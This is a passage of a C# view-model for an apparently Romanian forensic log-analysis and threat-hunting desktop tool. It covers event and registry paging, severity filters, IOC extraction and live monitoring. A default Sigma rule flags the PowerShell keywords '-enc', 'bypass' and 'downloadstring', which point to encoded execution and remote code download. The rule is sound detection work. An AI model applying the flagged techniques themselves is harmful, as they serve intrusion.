using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.ComponentModel;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Data;
using CommunityToolkit.Mvvm.ComponentModel;
using CommunityToolkit.Mvvm.Input;
using LogAnalyzer.Core.Models;
using LogAnalyzer.Core.Interfaces;
using LogAnalyzer.Core.Services;
using LogAnalyzer.Core.Services.Network;
using LogAnalyzer.Infrastructure;
using LogAnalyzer.Infrastructure.Engines;
using LogAnalyzer.Infrastructure.Parsers;
using LogAnalyzer.Infrastructure.Services;
using LogAnalyzer.Infrastructure.Watchers;
using Microsoft.Win32;
using LogAnalyzer.UI.Services;

namespace LogAnalyzer.UI.ViewModels
{
    public partial class MainViewModel : ObservableObject
    {
        private readonly IEventParser _eventParser;
        private readonly IAnalysisEngine _analysisEngine;
        private readonly IRegistryParser _registryParser;
        private readonly AuditLogService _auditService;
        private readonly KnowledgeBaseService _kbService;
        private readonly PluginManagerService _pluginManager;
        private readonly IDatabaseService _databaseService;
        private readonly IAuditCollectionService _collectionService;
        private readonly EvidenceIntakeService _evidenceIntake;
        private readonly LogAnalyzer.Infrastructure.Parsers.TriageCsvParser _triageCsvParser = new();

        private const int PageSize = 100;
        private string _currentSessionHashes = string.Empty;

        public ObservableCollection<ParsedEvent> Events { get; set; } = new();
        public ObservableCollection<DetectedIssue> DetectedIssues { get; set; } = new();
        public ObservableCollection<RegistryArtifact> RegistryArtifacts { get; set; } = new();
        public ObservableCollection<TimelineItem> TimelineItems { get; set; } = new();
        public ObservableCollection<IocItem> CurrentIocs { get; set; } = new();
        
        // Threat Hunting Command Center Collections
        public ObservableCollection<ProcessNode> ProcessTreeNodes { get; set; } = new();
        public ObservableCollection<SigmaRule> SigmaRules { get; set; } = new();
        [ObservableProperty] private SigmaRule? _selectedSigmaRule;
        public ObservableCollection<MitreTechnique> AttackTechniques { get; set; } = new();

        [ObservableProperty] private ICollectionView? _issuesView;

        [ObservableProperty] private string _searchEventsText = string.Empty;
        [ObservableProperty] private string _searchArtifactsText = string.Empty;

        private System.Timers.Timer? _searchDebounceTimer;
        private System.Timers.Timer? _registryDebounceTimer;

        [ObservableProperty] private string _inspectorMachineName = "-";
        [ObservableProperty] private string _inspectorProviderName = "-";
        [ObservableProperty] private string _inspectorTimeCreated = "-";
        [ObservableProperty] private string _inspectorMessage = "Selectează un eveniment sau artefact...";

        [ObservableProperty] private ParsedEvent? _selectedEvent;
        [ObservableProperty] private RegistryArtifact? _selectedArtifact;
        [ObservableProperty] private TimelineItem? _selectedTimelineItem;
        
        [ObservableProperty] private bool _isLoading;
        [ObservableProperty] private string _statusMessage = "Sistem pregătit pentru investigație offline...";
        [ObservableProperty] private double _loadingProgress = 0;
        [ObservableProperty] private string _loadingStepTitle = "Etapa 1/4: Scanare & Validare Fișiere";
        [ObservableProperty] private string _loadingSubDetail = string.Empty;
        [ObservableProperty] private bool _hideVerifiedAlerts;

#if AIR_GAPPED_EDITION
        [ObservableProperty] private bool _isAirGappedMode = true;
        [ObservableProperty] private bool _isNetworkMode = false;
        [ObservableProperty] private string _systemModeBadgeText = "🛡️ AIR-GAPPED STANDALONE";
        [ObservableProperty] private string _securityShieldStatusText = "IZOLARE FIZICĂ STRICTĂ — PROTOCOL AIR-GAPPED CONFORM HG 585 / NATO";
#else
        [ObservableProperty] private bool _isAirGappedMode = false;
        [ObservableProperty] private bool _isNetworkMode = true;
        [ObservableProperty] private string _systemModeBadgeText = "🌐 NETWORK SOC EDITION";
        [ObservableProperty] private string _securityShieldStatusText = "SCUT DE SECURITATE DISPOZITIV & REȚEA ACTIV";
#endif

        // Session / Module Management
        [ObservableProperty] private int _selectedModuleIndex = 0; // 0 for Forensics, 1 for Collection

        // AI / Heuristic Analysis Properties
        public ObservableCollection<AiAnomalyItem> AiAnomalies { get; set; } = new();
        [ObservableProperty] private int _aiRiskScore = 0;
        [ObservableProperty] private string _aiRiskLevel = "SCĂZUT (Normal)";
        [ObservableProperty] private string _aiRiskColor = "#22c55e";
        [ObservableProperty] private int _aiHighEntropyCount = 0;
        [ObservableProperty] private int _aiMasqueradingCount = 0;
        [ObservableProperty] private int _aiOffHoursCount = 0;
        [ObservableProperty] private int _aiYaraMatchesCount = 0;
        [ObservableProperty] private string _aiExecutiveSummary = "Sistemul este pregătit. Încărcați jurnale sau fișiere de triage pentru a iniția analiza euristică și calculul de entropie.";
        [ObservableProperty] private string _aiTacticalRecommendation = "1. Încărcați jurnalele EVTX sau folderul de triage.\n2. Examinați scorul de entropie al comenzilor PowerShell.\n3. Verificați alertele de securitate și corelările Sigma/YARA.";

        // Next-Gen Attack Storyline & APT Attribution
        private readonly AttackStorylineEngine _storylineEngine = new();
        private readonly AptAttributionEngine _aptEngine = new();
        private readonly ProvenanceLedgerService _provenanceLedger = new();
        private readonly ExplainableAiRiskEngine _explainableAiEngine = new();
        private readonly KerberosAdAttackEngine _kerberosEngine = new();
        private readonly LolbasEngine _lolbasEngine = new();
        private readonly Nis2NotificationService _nis2Service = new();
        private readonly CaseUcoExportService _caseUcoService = new();
        private readonly MitreMatrixCoverageEngine _mitreMatrixEngine = new();
        private readonly SigmaCorrelationEngine _correlationEngine = new();
        private readonly SuperTimelineExportService _timelineExportService = new();
        private readonly DfirCasePackagingService _casePackagingService = new();

        [ObservableProperty] private AttackStoryline _currentStoryline = new();
        [ObservableProperty] private MitreMatrixHeatmap _mitreHeatmap = new();
        public ObservableCollection<AttackStorylineNode> StorylineNodes { get; set; } = new();
        public ObservableCollection<AptActorProfile> AptAttributionProfiles { get; set; } = new();
        public ObservableCollection<ExplainableRiskFactor> ExplainableRiskFactors { get; set; } = new();
        public ObservableCollection<KerberosAdFinding> KerberosFindings { get; set; } = new();
        public ObservableCollection<LolbasFinding> LolbasFindings { get; set; } = new();
        public ObservableCollection<ProvenanceLedgerEntry> ProvenanceEntries { get; set; } = new();
        public ObservableCollection<MitreTacticColumn> MitreTacticColumns { get; set; } = new();
        public ObservableCollection<MultiEventCorrelationFinding> MultiEventCorrelations { get; set; } = new();
        [ObservableProperty] private string _provenanceStatusMessage = "✅ Lanț Criptografic Verificat (SHA-256)";

        // Live Rule Workbench (Sigma & YARA)
        [ObservableProperty] private string _workbenchRuleContent = "title: Execuție PowerShell Codificat\nlogsource:\n  category: process_creation\ndetection:\n  selection:\n    CommandLine|contains:\n      - '-enc'\n      - 'bypass'\n      - 'downloadstring'\n  condition: selection";
        [ObservableProperty] private string _workbenchCompileResult = "Introduceți o regulă Sigma YAML sau YARA și apăsați 'Compilează & Evaluează'.";
        [ObservableProperty] private int _workbenchMatchCount = 0;

        // Dashboard stats
        [ObservableProperty] private int _selectedTabIndex = 0;
        [ObservableProperty] private int _totalEventsCount;
        [ObservableProperty] private int _totalAlertsCount;
        [ObservableProperty] private int _totalRegistryCount;
        [ObservableProperty] private int _totalHostsCount;

        // Paging properties
        [ObservableProperty] private int _evtxCurrentPage = 1;
        [ObservableProperty] private int _evtxTotalPages = 1;
        [ObservableProperty] private int _registryCurrentPage = 1;
        [ObservableProperty] private int _registryTotalPages = 1;
        [ObservableProperty] private int _timelineCurrentPage = 1;
        [ObservableProperty] private int _timelineTotalPages = 1;

        // Cyber Telemetry & System Status
        [ObservableProperty] private string _operatorName = "-";
        [ObservableProperty] private string _databaseSize = "0.0 MB";
        [ObservableProperty] private string _licenseTier = "Ediție Standard";

        // Registry Sidebar Categories
        public ObservableCollection<string> RegistryCategories { get; } = new()
        {
            "Toate Cheile",
            "Persistență (Run/Autorun)",
            "Configurație (Sistem)"
        };
        [ObservableProperty] private string _selectedRegistryCategory = "Toate Cheile";

        // Advanced Forensic Filters
        [ObservableProperty] private bool _filterCritical = true;
        [ObservableProperty] private bool _filterHigh = true;
        [ObservableProperty] private bool _filterMedium = true;
        [ObservableProperty] private bool _filterInfo = true;
        [ObservableProperty] private string _filterEventId = string.Empty;
        [ObservableProperty] private bool _filterFailedLogins;
        [ObservableProperty] private bool _filterPrivEsc;
        [ObservableProperty] private string _filterTimeframePreset = "Toate"; // "Toate", "Ultima zi", "Ultimele 7 zile"

        public ObservableCollection<KeyValuePair<string, string>> SelectedEventProperties { get; } = new();
        [ObservableProperty] private string _selectedEventMitigation = string.Empty;
        [ObservableProperty] private string _selectedEventMitreMapping = string.Empty;
        [ObservableProperty] private string _selectedEventThreatScenario = string.Empty;

        // Audit Data Collection Properties
        public ObservableCollection<string> TargetTypes { get; } = new() { "PC", "Server", "NAS" };
        [ObservableProperty] private string _selectedTargetType = "PC";
        [ObservableProperty] private string _collectionOutputDir = "C:\\fișiere audit";
        [ObservableProperty] private string _collectionHostname = "PC-AUDIT";
        [ObservableProperty] private string _collectionLogs = string.Empty;
        [ObservableProperty] private bool _isCollectionRunning;
        [ObservableProperty] private int _syslogPort = 514;
        [ObservableProperty] private bool _isSyslogActive;

        public bool IsCollectionNotRunning => !IsCollectionRunning;
        public bool IsSyslogInactive => !IsSyslogActive;

        partial void OnIsCollectionRunningChanged(bool value) => OnPropertyChanged(nameof(IsCollectionNotRunning));
        partial void OnIsSyslogActiveChanged(bool value) => OnPropertyChanged(nameof(IsSyslogInactive));

        public ObservableCollection<DfirProfile> Profiles { get; } = new()
        {
            new DfirProfile { Name = "1. Toate Evenimentele (Implicit)", TargetEventIds = new() },
            new DfirProfile { Name = "2. Autentificări Eșuate", TargetEventIds = new() { 4625, 4771 } },
            new DfirProfile { Name = "3. Modificări Conturi", TargetEventIds = new() { 4720, 4722 } },
            new DfirProfile { Name = "4. Evaziune Jurnale", TargetEventIds = new() { 1102, 104 } }
        };

        [ObservableProperty] private DfirProfile? _selectedProfile;

        // Live Security Monitoring (Real-Time EDR & Streaming)
        private LiveEventLogWatcherService? _liveWatcher;
        private readonly LiveSecurityMonitoringEngine _liveEngine = new();
        public ObservableCollection<ParsedEvent> LiveStreamingEvents { get; } = new();
        public ObservableCollection<DetectedIssue> LiveAlerts { get; } = new();
        [ObservableProperty] private bool _isLiveMonitoringActive;
        [ObservableProperty] private string _liveMonitoringStatusText = "⏹ Monitorizare oprită. Apăsați 'Pornește Monitorizare Live'.";
        [ObservableProperty] private int _totalLiveEventsCaptured = 0;
        [ObservableProperty] private string _liveRemoteTargetHost = "localhost";
        [ObservableProperty] private DetectedIssue? _selectedLiveAlert;
        [ObservableProperty] private bool _isLiveToastVisible;
        [ObservableProperty] private DetectedIssue? _currentLiveToastAlert;
        private System.Timers.Timer? _toastAutoDismissTimer;

        // Countermeasure & Anti-Phishing Modal Engine
        private readonly CyberAttackCountermeasureEngine _countermeasureEngine = new();
        [ObservableProperty] private bool _isCountermeasureModalVisible;
        [ObservableProperty] private DetectedIssue? _activeCountermeasureAlert;
        [ObservableProperty] private CountermeasurePlaybook? _activeCountermeasurePlaybook;
        [ObservableProperty] private bool _isAutoShieldTriggered;
        [ObservableProperty] private string _autoShieldMessage = string.Empty;

        // Trigger DB reloading when search parameters change
        partial void OnSearchEventsTextChanged(string value)
        {
            if (_searchDebounceTimer == null)
            {
                _searchDebounceTimer = new System.Timers.Timer(400); // 400ms debounce
                _searchDebounceTimer.AutoReset = false;
                _searchDebounceTimer.Elapsed += (s, e) =>
                {
                    System.Windows.Application.Current?.Dispatcher.Invoke(() =>
                    {
                        EvtxCurrentPage = 1;
                        TimelineCurrentPage = 1;
                        ReloadEvtxFromDb();
                        ReloadTimelineFromDb();
                    });
                };
            }
            _searchDebounceTimer.Stop();
            _searchDebounceTimer.Start();
        }

        partial void OnSearchArtifactsTextChanged(string value)
        {
            if (_registryDebounceTimer == null)
            {
                _registryDebounceTimer = new System.Timers.Timer(400); // 400ms debounce
                _registryDebounceTimer.AutoReset = false;
                _registryDebounceTimer.Elapsed += (s, e) =>
                {
                    System.Windows.Application.Current?.Dispatcher.Invoke(() =>
                    {
                        RegistryCurrentPage = 1;
                        ReloadRegistryFromDb();
                    });
                };
            }
            _registryDebounceTimer.Stop();
            _registryDebounceTimer.Start();
        }

        partial void OnSelectedProfileChanged(DfirProfile? value)
        {
            EvtxCurrentPage = 1;
            ReloadEvtxFromDb();
        }

        partial void OnFilterCriticalChanged(bool value) => ApplyFiltersAndReload();
        partial void OnFilterHighChanged(bool value) => ApplyFiltersAndReload();
        partial void OnFilterMediumChanged(bool value) => ApplyFiltersAndReload();
        partial void OnFilterInfoChanged(bool value) => ApplyFiltersAndReload();
        partial void OnFilterEventIdChanged(string value) => ApplyFiltersAndReload();
        partial void OnFilterFailedLoginsChanged(bool value) => ApplyFiltersAndReload();
        partial void OnFilterPrivEscChanged(bool value) => ApplyFiltersAndReload();
        partial void OnFilterTimeframePresetChanged(string value) => ApplyFiltersAndReload();

        private void ApplyFiltersAndReload()
        {
            EvtxCurrentPage = 1;
            TimelineCurrentPage = 1;
            ReloadEvtxFromDb();
            ReloadTimelineFromDb();
        }

        private string GetFilteredSearchText(string originalSearch)
        {
            var levels = new List<string>();
            if (FilterCritical) levels.Add("Critical");
            if (FilterHigh) levels.Add("High");
            if (FilterMedium) levels.Add("Medium");
            if (FilterInfo) levels.Add("Info");

            var eventIds = new List<int>();
            if (!string.IsNullOrWhiteSpace(FilterEventId))
            {
                foreach (var idStr in FilterEventId.Split(','))
                {
                    if (int.TryParse(idStr.Trim(), out int id))
                        eventIds.Add(id);
                }
            }
            if (FilterFailedLogins)
            {
                eventIds.Add(4625);
                eventIds.Add(4771);
            }
            if (FilterPrivEsc)
            {
                eventIds.Add(4720);
                eventIds.Add(4722);
                eventIds.Add(4732);
                eventIds.Add(4728);
                eventIds.Add(4756);
                eventIds.Add(4672);
            }

            string timeframe = string.Empty;
            if (FilterTimeframePreset == "Ultima zi") timeframe = "24H";
            else if (FilterTimeframePreset == "Ultimele 7 zile") timeframe = "7D";

            var filterParts = new List<string>();
            if (levels.Count < 4)
            {
                filterParts.Add($"LEVELS:{string.Join(",", levels)}");
            }
            if (eventIds.Count > 0)
            {
                filterParts.Add($"EVENTIDS:{string.Join(",", eventIds.Distinct())}");
            }
            if (!string.IsNullOrEmpty(timeframe))
            {
                filterParts.Add($"TIMEFRAME:{timeframe}");
            }

            if (filterParts.Count > 0)
            {
                return $"[FILTER:{string.Join(";", filterParts)}]{originalSearch}";
            }
            return originalSearch;
        }

        partial void OnEvtxCurrentPageChanged(int value) => ReloadEvtxFromDb();
        partial void OnRegistryCurrentPageChanged(int value) => ReloadRegistryFromDb();
        partial void OnTimelineCurrentPageChanged(int value) => ReloadTimelineFromDb();
        partial void OnHideVerifiedAlertsChanged(bool value) => IssuesView?.Refresh();

        partial void OnSelectedRegistryCategoryChanged(string value)
        {
            RegistryCurrentPage = 1;
            ReloadRegistryFromDb();
        }

        public MainViewModel(
            IEventParser eventParser, IAnalysisEngine analysisEngine, IRegistryParser registryParser,
            AuditLogService auditService, KnowledgeBaseService kbService, PluginManagerService pluginManager,
            IDatabaseService databaseService, IAuditCollectionService collectionService, EvidenceIntakeService evidenceIntake)
        {
            _eventParser = eventParser;
            _analysisEngine = analysisEngine;
            _registryParser = registryParser;
            _auditService = auditService;
            _kbService = kbService;
            _pluginManager = pluginManager;
            _databaseService = databaseService;
            _collectionService = collectionService;
            _evidenceIntake = evidenceIntake;

            SelectedProfile = Profiles.First();

            try
            {
                string categoriesPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Categories");
                _kbService.LoadCategories(categoriesPath);
            }
            catch { }

            IssuesView = CollectionViewSource.GetDefaultView(DetectedIssues);
            IssuesView.Filter = FilterIssues;

            // Initialize Threat Hunting command center components
            InitializeProcessTree();
            InitializeSigmaRules();
            PopulateMitreMatrix();

            OperatorName = $"{Environment.UserName.ToUpper()} @ {Environment.MachineName.ToUpper()}";
#if !AIR_GAPPED_EDITION
            LicenseTier = "Enterprise Network SOC (Live EDR)";
            SelectedTabIndex = 11; // Open directly on Real-Time Live SOC Stream
            StartLiveMonitoring();
#else
            LicenseTier = "Enterprise Air-Gapped";
#endif
            UpdateDatabaseSize();
            RunAiAnalysis();
        }

        private void ReloadEvtxFromDb()
        {
            try
            {
                string filteredSearch = GetFilteredSearchText(SearchEventsText);
                var targetIds = SelectedProfile?.TargetEventIds ?? new List<int>();
                int count = _databaseService.GetEventsCount(filteredSearch, null, targetIds);
                EvtxTotalPages = Math.Max(1, (int)Math.Ceiling((double)count / PageSize));
                
                var list = _databaseService.GetEvents(PageSize, (EvtxCurrentPage - 1) * PageSize, filteredSearch, null, targetIds);
                Events.Clear();
                foreach (var ev in list) Events.Add(ev);
            }
            catch { }
        }

        private void ReloadRegistryFromDb()
        {
            try
            {
                string searchPayload = SearchArtifactsText;
                if (SelectedRegistryCategory == "Persistență (Run/Autorun)")
                {
                    searchPayload = $"[CAT:Persist]{SearchArtifactsText}";
                }
                else if (SelectedRegistryCategory == "Configurație (Sistem)")
                {
                    searchPayload = $"[CAT:Config]{SearchArtifactsText}";
                }

                int count = _databaseService.GetRegistryArtifactsCount(searchPayload);
                RegistryTotalPages = Math.Max(1, (int)Math.Ceiling((double)count / PageSize));
                
                var list = _databaseService.GetRegistryArtifacts(PageSize, (RegistryCurrentPage - 1) * PageSize, searchPayload);
                RegistryArtifacts.Clear();
                foreach (var reg in list) RegistryArtifacts.Add(reg);
            }
            catch { }
        }

        private void ReloadTimelineFromDb()
        {
            try
            {
                string filteredSearch = GetFilteredSearchText(SearchEventsText);
                int count = _databaseService.GetTimelineCount(filteredSearch);
                TimelineTotalPages = Math.Max(1, (int)Math.Ceiling((double)count / PageSize));
                
                var list = _databaseService.GetTimeline(PageSize, (TimelineCurrentPage - 1) * PageSize, filteredSearch);
                TimelineItems.Clear();
                foreach (var item in list) TimelineItems.Add(item);
            }
            catch { }
        }

        private void ReloadDashboardStats()
        {
            try
            {
                TotalEventsCount = _databaseService.GetEventsCount(null, null, null);
                TotalRegistryCount = _databaseService.GetRegistryArtifactsCount(null);
                TotalHostsCount = _databaseService.GetUniqueHostsCount();
                TotalAlertsCount = DetectedIssues.Count;

                PopulateMitreMatrix();
            }
            catch { }
        }

        [RelayCommand]
        private void SwitchModule(string indexStr)
        {
            if (int.TryParse(indexStr, out int index))
            {
                SelectedModuleIndex = index;
                if (index == 0)
                {
                    ReloadDashboardStats();
                }
            }
        }

        [RelayCommand]
        private void Navigate(string indexStr)
        {
            if (int.TryParse(indexStr, out int index))
            {
                SelectedTabIndex = index;
            }
        }

        [RelayCommand] private void NextEvtxPage() { if (EvtxCurrentPage < EvtxTotalPages) EvtxCurrentPage++; }
        [RelayCommand] private void PrevEvtxPage() { if (EvtxCurrentPage > 1) EvtxCurrentPage--; }

        [RelayCommand] private void NextRegistryPage() { if (RegistryCurrentPage < RegistryTotalPages) RegistryCurrentPage++; }
        [RelayCommand] private void PrevRegistryPage() { if (RegistryCurrentPage > 1) RegistryCurrentPage--; }

        [RelayCommand] private void NextTimelinePage() { if (TimelineCurrentPage < TimelineTotalPages) TimelineCurrentPage++; }
        [RelayCommand] private void PrevTimelinePage() { if (TimelineCurrentPage > 1) TimelineCurrentPage--; }

        [RelayCommand]
        private void ClearCache()
        {
            var result = MessageBox.Show(
                "Ești sigur că vrei să ștergi memoria cache și toate datele colectate în investigația curentă? Această acțiune este ireversibilă.",
                "Confirmare Ștergere Date",
                MessageBoxButton.YesNo,
                MessageBoxImage.Warning);

            if (result == MessageBoxResult.Yes)
            {
                try
                {
                    _databaseService.ClearDatabase();
                    
                    Events.Clear();
                    RegistryArtifacts.Clear();
                    TimelineItems.Clear();
                    DetectedIssues.Clear();
                    
                    ReloadDashboardStats();
                    UpdateDatabaseSize();
                    StatusMessage = "Baza de date și memoria cache au fost curățate cu succes.";
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"Eroare la ștergerea bazei de date: {ex.Message}", "Eroare", MessageBoxButton.OK, MessageBoxImage.Error);
                }
            }
        }

        [RelayCommand]
        private void ExportCsv()
        {
            var dialog = new SaveFileDialog
            {
                Filter = "Fișiere CSV (*.csv)|*.csv",
                FileName = $"Audit_Report_{DateTime.Now:yyyyMMdd_HHmmss}.csv"
            };

            if (dialog.ShowDialog() == true)
            {
                try
                {
                    var sb = new StringBuilder();
                    sb.AppendLine("Timestamp,Source,Category,Severity,MitreTags,UserOrHost,Description");
                    
                    string filteredSearch = GetFilteredSearchText(SearchEventsText);
                    var allTimeline = _databaseService.GetTimeline(10000, 0, filteredSearch);
                    foreach (var item in allTimeline)
                    {
                        var line = $"\"{item.Timestamp:yyyy-MM-dd HH:mm:ss}\",\"{EscapeCsv(item.Source)}\",\"{EscapeCsv(item.Category)}\",\"{EscapeCsv(item.Severity)}\",\"{EscapeCsv(item.MitreTags)}\",\"{EscapeCsv(item.UserOrHost)}\",\"{EscapeCsv(item.Description)}\"";
                        sb.AppendLine(line);
                    }

                    File.WriteAllText(dialog.FileName, sb.ToString(), Encoding.UTF8);
                    MessageBox.Show("Raportul CSV a fost exportat cu succes!", "Export Reușit", MessageBoxButton.OK, MessageBoxImage.Information);
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"Eroare la exportul raportului: {ex.Message}", "Eroare", MessageBoxButton.OK, MessageBoxImage.Error);
                }
            }
        }

        private string EscapeCsv(string? field)
        {
            if (field == null) return string.Empty;
            return field.Replace("\"", "\"\"");
        }

        [RelayCommand]
        private void OpenAuditFolder()
        {
            try
            {
                if (Directory.Exists(CollectionOutputDir))
                {
                    System.Diagnostics.Process.Start("explorer.exe", CollectionOutputDir);
                }
                else
                {
                    Directory.CreateDirectory(CollectionOutputDir);
                    System.Diagnostics.Process.Start("explorer.exe", CollectionOutputDir);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Nu s-a putut deschide folderul: {ex.Message}", "Eroare", MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }

        [RelayCommand]
        private void SelectCollectionOutputDir()
        {
            var dialog = new Microsoft.Win32.OpenFolderDialog { Title = "Selectează directorul rădăcină pentru audit" };
            if (dialog.ShowDialog() == true)
            {
                CollectionOutputDir = dialog.FolderName;
            }
        }

        [RelayCommand]
        private async Task StartCollectionAsync()
        {
            if (IsCollectionRunning) return;
            IsCollectionRunning = true;
            CollectionLogs = string.Empty;

            try
            {
                await _collectionService.RunCollectionAsync(
                    SelectedTargetType,
                    CollectionOutputDir,
                    CollectionHostname,
                    log => App.Current.Dispatcher.Invoke(() => CollectionLogs += log + Environment.NewLine)
                );
            }
            catch (Exception ex)
            {
                CollectionLogs += $"[FATAL ERROR] {ex.Message}" + Environment.NewLine;
            }
            finally
            {
                IsCollectionRunning = false;
            }
        }

        [RelayCommand]
        private void StartSyslog()
        {
            CollectionLogs = string.Empty;
            _collectionService.StartSyslogListener(
                SyslogPort,
                CollectionOutputDir,
                CollectionHostname,
                log => App.Current.Dispatcher.Invoke(() => CollectionLogs += log + Environment.NewLine)
            );
            IsSyslogActive = _collectionService.IsSyslogListenerActive;
        }

        [RelayCommand]
        private void StopSyslog()
        {
            _collectionService.StopSyslogListener();
            IsSyslogActive = false;
            CollectionLogs += "[SYSLOG] Receptorul de syslog a fost oprit de investigator." + Environment.NewLine;
        }

        private void UpdateInspector(string machine, string provider, string time, string message)
        {
            InspectorMachineName = machine;
            InspectorProviderName = provider;
            InspectorTimeCreated = time;
            InspectorMessage = message;

            Application.Current.Dispatcher.Invoke(() => CurrentIocs.Clear());

            if (string.IsNullOrWhiteSpace(message)) return;

            Task.Run(() => 
            {
                var iocs = new List<IocItem>();
                
                var ipMatches = Regex.Matches(message, @"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b");
                foreach (Match m in ipMatches) if (!iocs.Any(i => i.Value == m.Value)) iocs.Add(new IocItem { Type = IocType.IPv4, Value = m.Value });
                
                var hashMatches = Regex.Matches(message, @"\b[A-Fa-f0-9]{32}\b|\b[A-Fa-f0-9]{64}\b");
                foreach (Match m in hashMatches) if (!iocs.Any(i => i.Value == m.Value)) iocs.Add(new IocItem { Type = IocType.Hash, Value = m.Value });

                Application.Current.Dispatcher.Invoke(() => 
                {
                    foreach(var i in iocs) CurrentIocs.Add(i);
                });
            });
        }

        partial void OnSelectedEventChanged(ParsedEvent? value)
        {
            SelectedEventProperties.Clear();
            if (value == null)
            {
                UpdateInspector("-", "-", "-", "Selectează un eveniment sau artefact...");
                SelectedEventThreatScenario = string.Empty;
                SelectedEventMitreMapping = string.Empty;
                SelectedEventMitigation = string.Empty;
                return;
            }

            var assessment = ForensicEventKnowledgeService.GetAssessment(value);

            UpdateInspector(value.MachineName ?? "-", value.ProviderName ?? "-", value.TimeCreated.ToString("yyyy-MM-dd HH:mm:ss"), value.Message ?? "");

            SelectedEventProperties.Add(new("ID Eveniment", value.EventId.ToString()));
            SelectedEventProperties.Add(new("Titlu Evaluare", assessment.TitleRo));
            SelectedEventProperties.Add(new("Severitate", assessment.SeverityRo));
            SelectedEventProperties.Add(new("Sursă Jurnal", value.ProviderName ?? "-"));
            SelectedEventProperties.Add(new("Nume Echipament", value.MachineName ?? "-"));
            SelectedEventProperties.Add(new("Data Colectare", value.TimeCreated.ToString("yyyy-MM-dd HH:mm:ss")));

            if (!string.IsNullOrWhiteSpace(value.XmlData))
            {
                try
                {
                    var matches = Regex.Matches(value.XmlData, @"<Data Name=""([^""]+)"">([^<]*)</Data>");
                    foreach (Match match in matches)
                    {
                        var name = match.Groups[1].Value;
                        var val = match.Groups[2].Value;
                        if (!SelectedEventProperties.Any(p => p.Key == name))
                        {
                            SelectedEventProperties.Add(new(name, val));
                        }
                    }
                }
                catch { }
            }

            SelectedEventThreatScenario = assessment.ThreatScenarioRo;
            SelectedEventMitreMapping = assessment.MitreTtpRo;
            SelectedEventMitigation = assessment.ContainmentPlaybookRo;
        }

        partial void OnSelectedArtifactChanged(RegistryArtifact? value)
        {
            SelectedEventProperties.Clear();
            if (value == null)
            {
                UpdateInspector("-", "-", "-", "Selectează un eveniment sau artefact...");
                SelectedEventThreatScenario = string.Empty;
                SelectedEventMitreMapping = string.Empty;
                SelectedEventMitigation = string.Empty;
                return;
            }

            UpdateInspector("NTUSER", value.Category ?? "Registru", DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"), $"Cheie: {value.KeyPath}\nValoare: {value.ValueName}\nDate: {value.ValueData}");

            SelectedEventProperties.Add(new("Tip Hive", value.HiveType ?? "-"));
            SelectedEventProperties.Add(new("Categorie Registru", value.Category ?? "-"));
            SelectedEventProperties.Add(new("Cale Cheie", value.KeyPath ?? "-"));
            SelectedEventProperties.Add(new("Nume Valoare", value.ValueName ?? "-"));
            SelectedEventProperties.Add(new("Date Valoare", value.ValueData ?? "-"));
            string suspLevel = (value.SuspicionLevel ?? "None") switch
            {
                "High" => "Ridicată",
                "Critical" => "Critic",
                _ => "Niciunul"
            };
            SelectedEventProperties.Add(new("Nivel Suspiciune", suspLevel));

            if (value.SuspicionLevel == "High" || value.SuspicionLevel == "Critical")
            {
                SelectedEventThreatScenario = "Persistență în registry printr-o cheie de rulare automată nesemnificativă sau un serviciu nou.";
                SelectedEventMitreMapping = "Persistence - Boot or Logon Autostart Execution (T1547.001)";
                SelectedEventMitigation = "1. Analizarea fișierului executabil indicat în calea cheii.\n2. Verificarea semnăturii digitale a executabilului.\n3. Ștergerea cheii dacă executabilul este nelegitim.";
            }
            else
            {
                SelectedEventThreatScenario = "Modificare sau configurare registru Windows.";
                SelectedEventMitreMapping = "Defense Evasion - Modify Registry (T1112)";
                SelectedEventMitigation = "1. Verificați dacă modificarea provine de la un installer autorizat.\n2. Comparați cheia cu baseline-ul unui sistem curat.";
            }
        }

        partial void OnSelectedTimelineItemChanged(TimelineItem? value)
        {
            SelectedEventProperties.Clear();
            if (value == null)
            {
                UpdateInspector("-", "-", "-", "Selectează un eveniment sau artefact...");
                SelectedEventThreatScenario = string.Empty;
                SelectedEventMitreMapping = string.Empty;
                SelectedEventMitigation = string.Empty;
                return;
            }

            UpdateInspector(value.UserOrHost ?? "-", value.Source ?? "-", value.Timestamp.ToString("yyyy-MM-dd HH:mm:ss"), value.Description ?? "");

            SelectedEventProperties.Add(new("Timestamp", value.Timestamp.ToString("o")));
            SelectedEventProperties.Add(new("Sursă Corelare", value.Source ?? "-"));
            SelectedEventProperties.Add(new("Categorie", value.Category ?? "-"));
            SelectedEventProperties.Add(new("Severitate", value.Severity ?? "-"));
            SelectedEventProperties.Add(new("Etichete MITRE", value.MitreTags ?? "-"));
            SelectedEventProperties.Add(new("Utilizator/Host", value.UserOrHost ?? "-"));

            SelectedEventThreatScenario = $"Eveniment detectat în investigație: {value.Category}.";
            SelectedEventMitreMapping = value.MitreTags ?? "Eveniment Standard";
            SelectedEventMitigation = "1. Verificați evenimentele adiacente în timeline-ul din jurul acestei ore.\n2. Examinați detaliile hostului afectat.";
        }

        private bool _isPopupActive = false; 
        private DetectedIssue? _selectedIssue;
        
        public DetectedIssue? SelectedIssue
        {
            get => _selectedIssue;
            set
            {
                if (_isPopupActive) return;
                SetProperty(ref _selectedIssue, value);
                
                if (value != null)
                {
                    UpdateInspector("SOC", "Alertă Securitate", value.CreatedAt.ToString("yyyy-MM-dd HH:mm:ss"), $"{value.Title}\nSev: {value.Severity}\n{value.Explanation}");

                    Application.Current.Dispatcher.InvokeAsync(() => 
                    {
                        _isPopupActive = true;
                        var alertWindow = new LogAnalyzer.UI.Views.AlertDetailWindow(value, _auditService) { Owner = Application.Current.MainWindow };
                        alertWindow.ShowDialog();
                        _selectedIssue = null;
                        OnPropertyChanged(nameof(SelectedIssue));
                        IssuesView?.Refresh();
                        ReloadDashboardStats();
                        _isPopupActive = false;
                    });
                }
            }
        }

        [RelayCommand]
        private void OpenGenericDetail(object item)
        {
            if (item == null) return;
            Application.Current.Dispatcher.InvokeAsync(() => 
            {
